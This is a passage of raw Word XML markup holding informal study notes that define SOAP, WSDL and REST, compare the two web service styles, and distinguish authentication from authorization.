          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SOAP is Simple Object Access Protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SOAP is XML based protocol for accessing web Services.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>WSDL:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>It stands for Web Services Description Language.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00265DCC" w:rsidRPr="00584E67" w:rsidRDefault="00265DCC" w:rsidP="00265DCC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>WDSL is XML based language for describing Web Services.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1089" w:rsidRPr="00584E67" w:rsidRDefault="003A1089" w:rsidP="003A1089">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>SOAP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1089" w:rsidRPr="00584E67" w:rsidRDefault="003A1089" w:rsidP="003A1089">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Simple Object Access Protocol</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SOAP) standard an XML language defining a message architecture and message formats, is used by Web services it contain a description of the operations. WSDL is an XML-based language for describing Web services and how to access them. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> run on SMTP,HTTP,FTP etc. Requires middleware support, well defined </w:t>
      </w:r>
      <w:r w:rsidR="00E87678" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>mechanism</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to define services like WSDL+XSD, WS-Policy </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SOAP will return XML based data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1089" w:rsidRPr="00584E67" w:rsidRDefault="003A1089" w:rsidP="003A1089">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:snapToGrid w:val="0"/>
          <w:color w:val="000000"/>
          <w:w w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:color="000000"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="000000"/>
          <w:shd w:val="clear" w:color="000000" w:fill="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Representational State Transfer</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RESTful) web services. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>they</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> are second generation Web Services. RESTful web </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>services,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> communicate via HTTP than SOAP-based services and do not require XML messages or WSDL service-API definitions. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> REST no middleware is required only HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>support is needed.</w:t>
      </w:r>
      <w:r w:rsidR="00B41E59" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">WADL Standard, </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>REST can return XML, plain text, JSON, HTML etc</w:t>
      </w:r>
      <w:r w:rsidR="00DB6C44" w:rsidRPr="00584E67">
        <w:rPr>
          <w:snapToGrid w:val="0"/>
          <w:color w:val="000000"/>
          <w:w w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:color="000000"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="000000"/>
          <w:shd w:val="clear" w:color="000000" w:fill="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB6C44" w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5943600" cy="2887185"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="34" name="Picture 34" descr="D:\Gina Documents\SO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Gina Documents\SOAP.png"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId34" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="2887185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DB6C44" w:rsidRPr="00584E67" w:rsidRDefault="00DB6C44" w:rsidP="003A1089">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:snapToGrid w:val="0"/>
          <w:color w:val="000000"/>
          <w:w w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:color="000000"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="000000"/>
          <w:shd w:val="clear" w:color="000000" w:fill="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DB6C44" w:rsidRPr="00584E67" w:rsidRDefault="00DB6C44" w:rsidP="003A1089">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D62DD3" w:rsidRPr="00584E67" w:rsidRDefault="00D62DD3" w:rsidP="00D62DD3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Why REST is better than SOAP?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1089" w:rsidRPr="00584E67" w:rsidRDefault="00D62DD3" w:rsidP="00D62DD3">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Now that you know some differences between REST and SOAP web services, let's summarize our reasons of</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>why REST is better choice</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>for modern day web service requirement :</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>1. REST can be consumed by any client  e.g. Java, C++, Python client and even a web browser with Ajax and JavaScript.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>2. REST is lightweight as compared to SOAP, it doesn't require CPU consuming XML parsing and it also consumes less bandwidth because unlike SOAP, REST doesn't require a SOAP header for every message.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>3. SOAP is an old technologies, all modern technical giant are using REST e.g. Google, Twitter, and Flickr.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">4. REST is easy to learn, its just nouns and verbs. If you already know HTTP methods then </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> even easier.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>5. Java has excellent support for RESTFul web services, well it also has good support for SOAP web services but you have lots of choices here e.g. Jersey, RESTLet etc.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>That's all about</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>difference between REST and SOAP Web Service in Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Its's</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> one of the most frequently asked questions on Java web service topic. Since REST is the technology which is right now dominating web service space, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> also important to know the pros and cons REST style of web service provides over good old secure SOAP web services.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="287"/>
        <w:gridCol w:w="9073"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D62DD3" w:rsidRPr="00584E67" w:rsidTr="00D62DD3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="0" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="281" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="000A3836" w:rsidRPr="00584E67" w:rsidRDefault="000A3836" w:rsidP="00D62DD3">
            <w:pPr>
              <w:spacing w:after="0" w:line="316" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D62DD3" w:rsidRPr="00584E67" w:rsidRDefault="00D62DD3" w:rsidP="00D62DD3">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>Authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t> is the process of verifying who you are. When you log on to a PC with a user name and password you are authenticating.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D62DD3" w:rsidRPr="00584E67" w:rsidRDefault="00D62DD3" w:rsidP="00D62DD3">
            <w:pPr>
              <w:spacing w:after="94" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00D62DD3" w:rsidRPr="00584E67" w:rsidRDefault="00D62DD3" w:rsidP="00D62DD3">
            <w:pPr>
              <w:spacing w:after="94" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t>Authorization</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
              <w:t> is the process of verifying that you have access to something. Gaining access to a resource (e.g. directory on a hard disk) because the permissions configured on it allow you access is authorization.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="000A3836" w:rsidRPr="00584E67" w:rsidRDefault="000A3836" w:rsidP="000A3836">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
